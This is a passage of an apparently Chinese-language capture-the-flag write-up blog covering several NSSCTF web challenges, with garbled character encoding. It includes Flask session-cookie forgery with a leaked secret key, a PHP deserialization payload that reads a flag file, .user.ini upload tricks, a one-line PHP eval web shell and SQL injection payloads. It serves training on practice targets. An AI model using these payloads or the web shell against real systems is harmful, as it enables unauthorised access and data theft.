class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="symbol">&amp;gt;</span>ç™»å½•å¯†ç é‡ç½®<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;lastLi&quot;</span>&gt;</span><span class="symbol">&amp;gt;</span>é‡ç½®å®Œæˆ<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/line.png&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;itembox&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">label</span>&gt;</span>é‚®ç®±å·<span class="symbol">&amp;nbsp;</span>:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è¯·è¾“å…¥æ³¨å†Œé‚®ç®±å·&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btnBox&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>å‘é€é‡ç½®å¯†ç é‚®ä»¶<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer0&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer_l&quot;</span>&gt;</span>ä½¿ç”¨æ¡æ¬¾ | éšç§ä¿æŠ¤<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer_r&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>Â© C4skg<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>æœ‰é—®é¢˜è¯·å‘é€é‚®ä»¶è‡³ adm1n@flag.com <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- secretkey: th3f1askisfunny --&gt;</span></span><br></pre></td></tr></table></figure><h3 id="sessionå½é€ "><a href="#sessionå½é€ " class="headerlink" title="sessionå½é€ "></a>sessionå½é€ </h3><p>th3f1askisfunny , é€™å€‹å¯èƒ½æ˜¯sessionå½é€  </p><p>æ³¨å†Šä¸€ä¸‹ , 12345 12345 </p><img src="b01798a1df1520a7381ab32a4cfe6b57.png" alt="b01798a1df1520a7381ab32a4cfe6b57.png" /><img src="86e46a2828e01e9a7aafc13852a79603.png" alt="86e46a2828e01e9a7aafc13852a79603.png" /><p>session &#x3D; .eJwlzjEOwzAIAMC_MHcA45iQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjisLcamKZJCqMzdJMdcBiNjriJ9jhvQq1OvSeqZNTNDKCWKptXqohWdGV3QGuOK6BQR1I1akhZaoYyomqjqptrJl4Q7cp15_DcNvj_Owi_0.aOiRBw.bgLfdWhJg0-721Y0mDQlFm8j0gM</p><p>ä¸‹è¼‰: <a href="https://">https://github.com/noraj/flask-session-cookie-manager</a></p><p>æˆ‘è¦ç”¨Ubuntu æ‰å¯ä»¥conda (web_env) </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &quot;.eJwlzjEOwzAIAMC_MHcA45iQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjisLcamKZJCqMzdJMdcBiNjriJ9jhvQq1OvSeqZNTNDKCWKptXqohWdGV3QGuOK6BQR1I1akhZaoYyomqjqptrJl4Q7cp15_DcNvj_Owi_0.aOiRBw.bgLfdWhJg0-721Y0mDQlFm8j0gM&quot; -s &quot;th3f1askisfunny&quot;</span><br><span class="line"></span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;2&#x27;&#125;</span><br></pre></td></tr></table></figure><p>åˆç†çŒœæ¸¬id &#x3D; 1 </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> python3 flask_session_cookie_manager3.py encode -s &quot;th3f1</span><br><span class="line">askisfunny&quot; -t &quot; &#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd</span><br><span class="line">4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br><span class="line"></span><br><span class="line">.eJwlzjEOwzAIAMC_MHeAYJuQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjhs6camKZJCqMzNJMfsg5ExV5E2xw3o1ajVJPXMmpkhlBJF02p10YrGjC5oC-OK6BQR1IyWJC20QhlRNVHVTbWR94Q7cp15_DcE3x_Ovy_z.aOiklg.8mo1XmLqTIj-6RuRxvgu7__4Y-g</span><br></pre></td></tr></table></figure><img src="5e432dcdae883b55ace167cf0a4183b7.png" alt="5e432dcdae883b55ace167cf0a4183b7.png" /><img src="e7ebc9cb9ac2e7adfe317a16803a861d.png" alt="e7ebc9cb9ac2e7adfe317a16803a861d.png" /><img src="ab72b2d9bf4d126f3f38646240947868.png" alt="ab72b2d9bf4d126f3f38646240947868.png" /><h2 id="21-ez-SSTI"><a href="#21-ez-SSTI" class="headerlink" title="21.ez_SSTI"></a>21.ez_SSTI</h2><p>åœ¨kaliå®‰è£fenjing :</p><p>pip install fenjing -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure><img src="96f12fb4d30448b04b349f1049b740c3.png" alt="96f12fb4d30448b04b349f1049b740c3.png" /><p>è¼¸å…¥åƒæ•¸é–‹å§‹çˆ†ç ´</p><h2 id="22-easy-unser"><a href="#22-easy-unser" class="headerlink" title="22.easy_unser"></a>22.easy_unser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;f14g.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is unserialized,I will be called&quot;</span>;</span><br><span class="line">        <span class="variable">$but</span> = <span class="string">&quot;I can CHANGE you&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt; want = <span class="variable">$but</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;C1ybaby!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;So,let me see if you can get what you want\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;todonothing === <span class="variable language_">$this</span>-&gt;want)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;é²å‹ƒ,åˆ«å‚»æ„£ç€!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;I can CHANGE you&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You are not you....&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;want))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You want my heart?No way!\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You got it!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;want);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">unserializeorder</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CORE</span> = <span class="string">&quot;äººç±»æœ€å¤§çš„æ•Œäºº,å°±æ˜¯æ— åº. Yahi param vaastavikta hai!&lt;BR&gt;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is serialized,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is used as a string,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;CORE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">unserializeorder</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ywant</span> = @<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ywant</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">äººç±»æœ€å¤§çš„æ•Œäºº,å°±æ˜¯æ— åº. Yahi param vaastavikta hai!</span><br><span class="line">We Come To HNCTF,Enjoy the ser14l1zti0n</span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p> æ˜¯å°† PHP å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ serialize() å‡½æ•°æ¥å®ç°ã€‚è¯¥å‡½æ•°å°†å¯¹è±¡çš„çŠ¶æ€ä»¥åŠå®ƒçš„ç±»åå’Œå±æ€§å€¼ç¼–ç ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å¯ä»¥å­˜å‚¨åœ¨æ–‡ä»¶ä¸­ï¼Œå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œæˆ–è€…é€šè¿‡ç½‘ç»œä¼ è¾“åˆ°å…¶ä»–åœ°æ–¹ã€‚</p><p><a href="https://">https://www.bilibili.com/video/BV1GN4y1c7ut/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=f14g.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">body</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/:2:&#123;/&quot;</span>,<span class="string">&quot;:3:&#123;&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="901aacec5c9e8f412935b1b1d82ee2df.png" alt="901aacec5c9e8f412935b1b1d82ee2df.png" /><img src="ddf40e1c15fcf00cddda177797c0b080.png" alt="ddf40e1c15fcf00cddda177797c0b080.png" /><h2 id="23-çœ‹çœ‹ip"><a href="#23-çœ‹çœ‹ip" class="headerlink" title="23.çœ‹çœ‹ip"></a>23.çœ‹çœ‹ip</h2><img src="e78ab70aec28838ebc8bb91f50c10425.png" alt="e78ab70aec28838ebc8bb91f50c10425.png" /><p>IPæ˜¯çº¿ç´¢</p><p>åŠ ä¸€å€‹X-Forwarded-For </p><p>æ˜¯&#123;&#123;&#125;&#125; æ¨¡æ¿æ³¨å…¥</p><img src="07c07948454ee7ffc48f71d2eef2732d.png" alt="07c07948454ee7ffc48f71d2eef2732d.png" /><img src="73975aaedff0f314a228b66e81360da9.png" alt="73975aaedff0f314a228b66e81360da9.png" /><img src="02fe2b5fd3b0159f32acd93815881dfa.png" alt="02fe2b5fd3b0159f32acd93815881dfa.png" /><h2 id="24-æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶"><a href="#24-æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶" class="headerlink" title="24.æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶"></a>24.æ€ä¹ˆå¤šäº†ä¸ªæ²¡ç”¨çš„phpæ–‡ä»¶</h2><img src="e715b46d3754d888ea7138fafc0bafe2.png" alt="e715b46d3754d888ea7138fafc0bafe2.png" /><img src="69a1a0687d44b0021a45a50f3ac70355.png" alt="69a1a0687d44b0021a45a50f3ac70355.png" /><p>å¯ä»¥çœ‹è¦‹åœ¨uploadsæ–‡ä»¶å¤¾ä¸‹æœ‰, å€‹notion.php</p><img src="17919fb51068948349cf90f788b55f77.png" alt="17919fb51068948349cf90f788b55f77.png" /><p>èšå‰‘ fuzz</p><p>æœåŠ¡å™¨æ˜¯ nginx ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ htaccess(è¶…æ–‡ä»¶)</p><img src="a8ae227886464f5d88225ca1e48e38b8.png" alt="a8ae227886464f5d88225ca1e48e38b8.png" /><h3 id="Apache-çš„-htaccess-æœºåˆ¶"><a href="#Apache-çš„-htaccess-æœºåˆ¶" class="headerlink" title="Apache çš„ .htaccess æœºåˆ¶"></a>Apache çš„ .htaccess æœºåˆ¶</h3><ul><li>åˆ†å¸ƒå¼é…ç½®ï¼šApache è¢«è®¾è®¡ä¸ºå…è®¸åœ¨æ¯ä¸ªç›®å½•ä¸‹æ”¾ç½®ä¸€ä¸ª .htaccess æ–‡ä»¶ã€‚</li><li>è¿è¡Œæ—¶è¯»å–ï¼šå½“æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚æ—¶ï¼ŒApache ä¼šä»ç½‘ç«™æ ¹ç›®å½•å¼€å§‹ï¼Œä¸€è·¯å‘ä¸ŠæŸ¥æ‰¾å¹¶è§£ææ¯ä¸€çº§ç›®å½•ä¸‹çš„ .htaccess æ–‡ä»¶ï¼Œç„¶åå®æ—¶åº”ç”¨å…¶ä¸­çš„è§„åˆ™ã€‚</li><li>ä¼˜ç‚¹ï¼šæ–¹ä¾¿å…±äº«ä¸»æœºç”¨æˆ·åœ¨ä¸æ¥è§¦ä¸»é…ç½®æ–‡ä»¶çš„æƒ…å†µä¸‹ä¿®æ”¹é…ç½®ã€‚</li><li>ç¼ºç‚¹ï¼šæ€§èƒ½æœ‰å¼€é”€ï¼Œå› ä¸ºæ¯ä¸ªè¯·æ±‚éƒ½å¯èƒ½è¦è¯»å–å¤šä¸ªæ–‡ä»¶ã€‚</li></ul><h3 id="Nginx-çš„é…ç½®"><a href="#Nginx-çš„é…ç½®" class="headerlink" title="Nginx çš„é…ç½®"></a>Nginx çš„é…ç½®</h3><ul><li>é›†ä¸­å¼é…ç½®ï¼šNginx æ²¡æœ‰ç±»ä¼¼ .htaccess çš„æœºåˆ¶ã€‚å®ƒçš„æ‰€æœ‰é…ç½®éƒ½é›†ä¸­åœ¨ä¸€ä¸ªä¸»é…ç½®æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ nginx.confï¼‰ä»¥åŠé€šè¿‡ include æŒ‡ä»¤å¼•å…¥çš„å…¶ä»–é…ç½®æ–‡ä»¶ä¸­ã€‚</li><li>å¯åŠ¨æ—¶åŠ è½½ï¼šNginx åœ¨å¯åŠ¨æˆ–é‡è½½æ—¶ï¼Œä¼šä¸€æ¬¡æ€§è¯»å–å¹¶ç¼–è¯‘æ‰€æœ‰é…ç½®ï¼Œå½¢æˆä¸€ä¸ªé«˜æ•ˆçš„é…ç½®æ ‘ã€‚</li><li>ä¼˜ç‚¹ï¼šæ€§èƒ½æé«˜ï¼Œå› ä¸ºå¤„ç†è¯·æ±‚æ—¶ä¸éœ€è¦å†å»æ–‡ä»¶ç³»ç»Ÿé‡ŒæŸ¥æ‰¾å’Œè§£æé¢å¤–çš„é…ç½®æ–‡ä»¶ã€‚</li><li>ç¼ºç‚¹ï¼šç”¨æˆ·å¿…é¡»èƒ½è®¿é—®æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼Œæˆ–è€…åœ¨ server å—å†…æ‹¥æœ‰å†™å…¥æƒé™ï¼ˆä¾‹å¦‚é€šè¿‡æ§åˆ¶é¢æ¿ï¼‰</li></ul><p>å¯«ä¸€ä¸‹: auto_prepend_file &#x3D; 1.png</p><p>æ”¹æˆ.user.iniæ–‡ä»¶</p><p>ç”¨BPæŠ“åŒ… , ä¸Šå‚³iniæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.user.ini</span><br><span class="line">auto_prepend_file=xxx è¡¨ç¤ºåœ¨æ–‡ä»¶é ­åŒ…å«</span><br><span class="line">auto_append_file=xxx è¡¨ç¤ºåœ¨æ–‡ä»¶å°¾åŒ…å«</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure><p>.user.iniæ–‡ä»¶æ˜¯ä¸€ç¨®æ—¥å¿—åŒ…å« , ç„¶å¾Œåœ¨è¨ªå•çš„æ™‚å€™uaåŠ ä¸Šä¸€å¥è©±, å†ä¸Šå‚³ä¸€å€‹phpæ–‡ä»¶ä¾†é€²è¡Œä¸€å€‹åŒ…å«ã€‚</p><img src="b9623524e79975298235b69e9ddb8e97.png" alt="b9623524e79975298235b69e9ddb8e97.png" /><p>å†ä¸Šå‚³ä¸€å¥è©±æœ¨é¦¬ 1.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;123&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“notion.phpåŒ…å«äº†ä¸Šé¢çš„ä»£ç¢¼, ç”¨notion.phpé€£ç·š:</p><img src="64a4dbb9c2cc139206a9233aaa925ead.png" alt="64a4dbb9c2cc139206a9233aaa925ead.png" /><img src="a770e99ebcab1e349cb7e231a2b5f1e3.png" alt="a770e99ebcab1e349cb7e231a2b5f1e3.png" /><img src="8cc9167e7d7a68e18fa21af218e726e7.png" alt="8cc9167e7d7a68e18fa21af218e726e7.png" /><br/><img src="55e24b74ad632bb9d989ef7a1bc54d4e.png" alt="55e24b74ad632bb9d989ef7a1bc54d4e.png" /><p>NSSCTF{213a5655-425e-4ac9-b0bd-32f9e6ea9af4}</p><h2 id="25-UploadBaby"><a href="#25-UploadBaby" class="headerlink" title="25.UploadBaby"></a>25.UploadBaby</h2><p>å¯æ¶çš„å‰ç«¯ï¼Œä¸è®©æˆ‘ä¼ word é©¬ï¼ŒæŠŠä½ æ‰¬äº†å°±è€å®äº†</p><img src="79d8ae6d5190ad9b97e4ac828c647c0b.png" alt="79d8ae6d5190ad9b97e4ac828c647c0b.png" /><img src="176c7a599d2243f544194ea825785c48.png" alt="176c7a599d2243f544194ea825785c48.png" /><p><a href="http://node6.anna.nssctf.cn:29933/uploads/1.php">http://node6.anna.nssctf.cn:29933/uploads/1.php</a></p><img src="038c210cb9ebb9c7215a35440029c686.png" alt="038c210cb9ebb9c7215a35440029c686.png" /><img src="b65a95273debd8677d7b34f1e4a9f167.png" alt="b65a95273debd8677d7b34f1e4a9f167.png" /><h2 id="26-ez-sql"><a href="#26-ez-sql" class="headerlink" title="26.ez_sql"></a>26.ez_sql</h2><img src="22c4a7ca350c2e376f7fa15a302be6ae.png" alt="22c4a7ca350c2e376f7fa15a302be6ae.png" /><p>ç›¸å¯¹å®‰å…¨çš„æ–¹å¼ä¼ å‚?????</p><img src="bf8307cd110d03d41a1c9d56e01f6146.png" alt="bf8307cd110d03d41a1c9d56e01f6146.png" /><img src="a2baabd2b65aa66654c5b9844891b59c.png" alt="a2baabd2b65aa66654c5b9844891b59c.png" /><img src="ea2230b1eec711aa501065f0294f173d.png" alt="ea2230b1eec711aa501065f0294f173d.png" /><p>åˆ¤æ–­åˆ—æ•°å…ˆ</p><p>åŒå†™å‘½ä»¤ç»•è¿‡:<br><img src="f714aaf2dcedaab4bfdb6915775046b1.png" alt="f714aaf2dcedaab4bfdb6915775046b1.png" /></p><p>åˆ—æ•°ä¸º3</p><p>åˆ¤æ–­æ˜¾ç¤ºä½</p><img src="66831d116f87b5c4f1165d2d51722e4e.png" alt="66831d116f87b5c4f1165d2d51722e4e.png" /><p>å°è¯•æŸ¥çœ‹ç¬¬äºŒè¡Œ</p><img src="de806c50d12a11da6d7fc221662342ca.png" alt="de806c50d12a11da6d7fc221662342ca.png" /><p>æŸ¥è¯¢æ•°æ®åº“å</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),(select/**/group_concat(schema_name)/**/from/**/infoorrmation_schema.schemata)/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="e12f0d6df8aa9cf805081a86bde10b4b.png" 